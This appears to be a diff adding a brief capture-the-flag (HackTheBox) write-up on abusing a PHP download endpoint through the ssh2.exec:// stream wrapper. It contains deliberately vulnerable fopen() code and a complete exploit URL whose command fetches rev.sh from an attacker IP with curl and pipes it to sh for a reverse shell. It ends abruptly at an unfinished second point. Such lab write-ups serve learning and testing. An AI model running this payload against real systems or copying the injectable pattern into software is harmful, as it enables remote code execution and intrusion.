@@ -1,0 +1,47 @@
+You foudn a form that you upload a file and goes at a random id.
+You need to use burp to find the usefull ids with intruder or with Fuff.
+
+then you might have something like:
+
+1. PHP Stream Wrappers
+You might have fopen(), file_get_contents() etc. with special prefixes like:
+
+file:// → local files
+http:// → HTTP requests
+php://input, php://filter → special streams
+ssh2.exec:// → SSH command execution via libssh2
+
+🚀ssh2.exec://
+The stream wrapper ssh2.exec://user:pass@host/command:
+Opens a connection SSH at host with credentials
+Executes command at remote host
+and returns the output like a stream (etc. fopen())
+
+
+Example code:
+
+$format = isset($_GET['format']) ? $_GET['format'] : '';
+$file = $fetched[0];
+
+if (strpos($format, '://') !== false) {
+    $wrapper = $format;
+    header('Content-Type: application/octet-stream');
+} else {
+    $wrapper = '';
+    header('Content-Type: text/html');
+}
+$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
+
+
+If you gave it:
+format=ssh2.exec://xxxx:xxxx@127.0.0.1/            (creds for an accoun => xxxx)
+and $file has value:
+curl+-s+http://10.10.xx.xx/rev.sh|sh
+Then you get a:
+$full_path = "ssh2.exec://xxx:xxx@127.0.0.1/curl+-s+http://10.10.xx.xx/rev.sh|sh";
+
+So the whole payload is:
+http://xxxx.xxx.htb/download.php?id=3324&show=true&format=ssh2.exec://xxxx:xxxxx@127.0.0.1/curl+-s+http://10.10.xx.xx/rev4.sh|sh;
+
+
+2. 
